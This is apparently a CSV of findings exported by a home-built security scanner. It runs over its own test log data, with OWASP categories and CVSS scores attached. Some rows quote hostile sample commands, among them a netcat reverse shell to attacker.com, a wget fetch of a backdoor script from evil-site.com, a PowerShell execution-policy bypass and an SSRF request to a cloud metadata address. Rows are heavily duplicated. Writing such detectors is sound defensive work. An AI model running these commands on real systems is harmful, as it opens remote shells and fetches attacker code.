Keyword,Severity,Confidence,OWASP,CVSS,Remediation,File,Line,Content
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5023,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5031,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5039,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5047,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5055,"""content"": ""\""content\"": \""WARN Admin endpoint accessed: /admin/dashboard\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5084,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5092,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5100,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5108,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5116,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5124,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5132,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5140,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5148,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5156,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5164,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5172,"""content"": ""\""content\"": \""WARN Shell execution detection: os.system(cmd)\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5201,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5209,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5217,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5225,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5233,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5241,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5249,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5257,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5265,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5273,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5281,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5289,"""content"": ""\""content\"": \""WARN wget http://evil-site.com/backdoor.sh\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5318,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5326,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5334,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5342,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5350,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5358,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5366,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5374,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5382,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5390,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5398,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5406,"""content"": ""\""content\"": \""WARN nc -e /bin/sh attacker.com 4444\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5435,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5443,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5451,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5459,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5467,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5475,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5483,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5491,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5499,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5507,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5515,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
pickle_loads,UNKNOWN,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5523,"""content"": ""\""content\"": \""ERROR Unsafe deserialization: pickle.loads(user_data)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5552,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5560,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5568,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5576,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5584,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5592,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5600,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5608,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5616,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5624,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5632,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
eval_usage,UNKNOWN,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5640,"""content"": ""\""content\"": \""CRITICAL Dangerous eval detected: eval(user_input)\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5669,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5677,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5685,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5693,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5701,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5709,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5717,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5725,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5733,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5741,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5749,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
powershell,UNKNOWN,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,5757,"""content"": ""\""content\"": \""ALERT powershell.exe -ExecutionPolicy Bypass\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6254,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6262,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6270,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6278,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6286,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6294,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6302,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6310,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6318,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6326,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6334,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6342,"""content"": ""\""content\"": \""WARN Debug endpoint exposed: /debug/config\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6371,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6379,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6387,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6395,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6403,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6411,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6419,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6427,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6435,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6443,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6451,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6459,"""content"": ""\""content\"": \""SSRF request to http://169.254.169.254/latest/meta-data\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6488,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6496,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6504,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6512,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6520,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6528,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6536,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
